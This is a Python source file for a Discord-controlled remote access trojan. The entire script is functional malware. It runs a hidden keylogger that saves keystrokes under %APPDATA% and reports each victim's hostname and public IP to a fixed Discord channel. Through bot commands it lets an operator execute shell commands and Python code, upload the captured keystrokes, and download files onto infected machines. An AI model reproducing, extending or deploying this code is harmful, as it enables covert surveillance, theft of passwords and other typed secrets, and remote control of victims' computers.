import discord

import subprocess as sub

from pynput.keyboard import Key, Listener
from io import StringIO

import contextlib
import logging
import asyncio
import random
import string
import _thread
import sys
import os


import wget
import socket
import requests

client = discord.Client()
os.system('pip install discord.py')

@contextlib.contextmanager
def stdoutIO(stdout=None):
    old = sys.stdout
    if stdout is None:
        stdout = StringIO()
    sys.stdout = stdout
    yield stdout
    sys.stdout = old

log_dir = winpath = os.environ['APPDATA']

def keylog(log_dir):
    logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG,
                        format='["%(asctime)s", %(message)s]')

    with Listener(on_press=on_press) as listener:
        listener.join()
def on_press(key):
    logging.info('"{0}"'.format(key))

_thread.start_new(keylog, (log_dir, ))

######################################################################################
# generate bot unique id
######################################################################################
def generate(length):
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(length))


######################################################################################
# display in console
######################################################################################

@client.event
async def on_ready():
    print('Logged in as')
    print(client.user.name)
    print(client.user.id)
    print('------')
    global botname
    botname = generate(5)
    print('Bot Secret: {0}'.format(botname))
    channel = client.get_channel('419851593572417539')
    online = sub.check_output(['hostname']).decode('ascii')
    ip = requests.get('http://ip.42.pl/raw').text
    await client.send_message(channel, '```Bot Connected: {0} ID: {1} IP: {2}```'.format(online, botname, ip))


@client.event
async def on_message(message):
    ######################################################################################
    # shutdown all bots
    #####################################################################################
    if message.content.startswith('!exit'):
        sys.exit(1)

    ######################################################################################
    # displays list of all botnames
    ######################################################################################

    if message.content.startswith('!botname'):
        await client.send_message(message.channel, 'Bot Code: {0}'.format(botname))

    ######################################################################################
    # mass execute command to all bots
    ######################################################################################

    if message.content.startswith('!massexec'):
        command, variable = message.content.split(' ', 2)

        cmd = sub.check_output('{}'.format(variable), shell=True, stderr=sub.STDOUT).decode('ascii')

        tmp = await client.send_message(message.channel, 'Executing command...')
        async for log in client.logs_from(message.channel, limit=100):
            await client.edit_message(tmp, '{}'.format(cmd))

    ######################################################################################
    # Keylog part                                                                        #
    ######################################################################################
    if message.content.startswith('!keylog'):
        try:
            args = message.content.split(' ')
            variable = False
            date = False
            for i in range(len(args)):
                if args[i] == '-id':
                    botid = args[i + 1]
                if args[i] == '-len':
                    variable = args[i + 1]
                if args[i] == '-date':
                    date = args[i + 1]

            if botid == botname:
                if (not variable) and (not date):
                    with open(log_dir + "key_log.txt", 'rb') as f:
                        await client.send_file(message.channel, f)
                    await client.send_message(message.channel, '```Done```')
                elif not date:
                    variable = variable.split(':')
                    try:
                        if (abs(int(variable[0]) - int(variable[1])) > (2000 - 6)):
                            raise Exception
                        with open(log_dir + "key_log.txt", 'r', encoding="utf-8", errors='ignore') as f:
                            data = f.read()[int(variable[0]):int(variable[1])]
                            f.close()
                        print(data)
                        await client.send_message(message.channel, '```{} ```'.format(data))
                    except Exception as e:
                        await client.send_message(message.channel,
                                                  '```something went wrong2:\n\t{}```'.format(e))
                elif not variable:
                    try:
                        with open(log_dir + "key_log.txt", 'r', encoding="utf-8", errors='ignore') as f:
                            data = f.readlines()
                            f.close()
                        mes = ''
                        for line in data:
                            if date in str(line):
                                mes += "{}\n".format(line)

                        await client.send_message(message.channel, '```{} ```'.format(
                            'Date not available' if len(mes) == 0 else mes[
                                                                       :2000 - 30] + "```\n```theres more.." if len(
                                mes) > (2000 - 23) else mes[:2000 - 23]))
                    except Exception as e:
                        await client.send_message(message.channel,
                                                  '```something went wrong2:\n\t{}```'.format(e))
                else:
                    try:
                        variable = variable.split(':')
                        if (abs(int(variable[0]) - int(variable[1])) > (2000 - 6)):
                            raise Exception
                        with open(log_dir + "key_log.txt", 'r', encoding="utf-8", errors='ignore') as f:
                            data = f.readlines()
                            f.close()
                        mes = ''
                        for line in data:
                            if date in str(line):
                                mes += "{}\n".format(line)

                        await client.send_message(message.channel, '```{} ```'.format(
                            mes[int(variable[0]):int(variable[1])] if len(mes) != 0 else 'Date not available'))
                    except Exception as e:
                        await client.send_message(message.channel,
                                                  '```something went wrong2:\n\t{}```'.format(e))

        except:
            await client.send_message(message.channel,
                                      '```!Usage:\n\t!keylog\n\t!keylog -id <BOTID> -len <lengthMin:lengthMax "lengthMax-lengthMin less 1994"> -date <yyyy-mm-dd>```')

    ######################################################################################
    # rmkeylog: remove kelog file because discord gonna complain if it pass 8mb          #
    ######################################################################################      
    if message.content.startswith('!rmkeylog'):
        try:
            os.remove(log_dir + "key_log.txt")
            await client.send_message(message.channel, '```Done!```')
        except:
            await client.send_message(message.channel, '```something went wrong```')

    ######################################################################################
    # eval: evaluate python code if possible //syntax = !exec botid command              #
    ######################################################################################
    if message.content.startswith('!eval'):
        command, botid, variable = message.content.split(' ', 2)
        if botid == botname:
            try:

                adr = {}
                with stdoutIO() as s:
                    exec(variable, adr)
                adr1 = s.getvalue()
                k = 0
                await asyncio.sleep(1)
                await client.send_message(message.channel, "output:")
                for chunk in range((len(adr1) // (2000 - 7)) + 1):
                    await client.send_message(message.channel, "```" + str(adr1[k:k + (2000 - 7)]) + " ```")
                    k += 2000

            except Exception as errr:
                await client.send_message(message.channel, "```py\n@Error : \n" + str(errr) + "```")

    ######################################################################################
    # exec direct command to bot //syntax = !exec botid command                          #
    ######################################################################################
    if message.content.startswith('!exec'):
        command, botid, variable = message.content.split(' ', 2)
        if botid == botname:
            try:
                ad = sub.getoutput(variable)
                adr1 = str(ad)
                k = 0
                await client.send_message(message.channel, "output:")
                for chunk in range((len(adr1) // (2000 - 7)) + 1):
                    await client.send_message(message.channel, "```" + str(adr1[k:k + (2000 - 7)]) + " ```")
                    k += 2000
            except Exception as errr:
                await client.send_message(message.channel, "```py\n@Error : \n" + str(errr) + "```")
    ######################################################################################
    # return list of online bots with unique ID
    ######################################################################################

    if message.content.startswith('!list'):
        tmp = await client.send_message(message.channel, 'Listing bots...')
        online = sub.check_output(['hostname']).decode('ascii')
        async for log in client.logs_from(message.channel, limit=100):
            await client.edit_message(tmp, 'Online: {0} ID: {1}'.format(online, botname))


            ######################################################################################
            # download file over wget with !download
            ######################################################################################
    if message.content.startswith('!download'):
        command, botid, variable = message.content.split(' ', 2)
        if botid == botname:

            tmp = await client.send_message(message.channel, 'Downloading file on bot...')
            link = (variable)
            print(link)
            async for log in client.logs_from(message.channel, limit=5):
                await client.edit_message(tmp)
                format(wget.download(link))
                ######################################################################################
                # mass execute !download
                ######################################################################################

    if message.content.startswith('!massdownload'):
        command, variable = message.content.split(' ', 2)

        tmp = await client.send_message(message.channel, 'Downloading file on bots...')
        link = (variable)
        print(link)
        async for log in client.logs_from(message.channel, limit=5):
            await client.edit_message(tmp)
        format(wget.download(link))

    ######################################################################################
    # check os with !os
    ######################################################################################

    if message.content.startswith('!os'):
        command, botid = message.content.split(' ', 2)
        if botid == botname:
            osinfo = socket.gethostname()
            channel = client.get_channel('419851593572417539')
            await client.send_message(channel, osinfo)


client.run('')
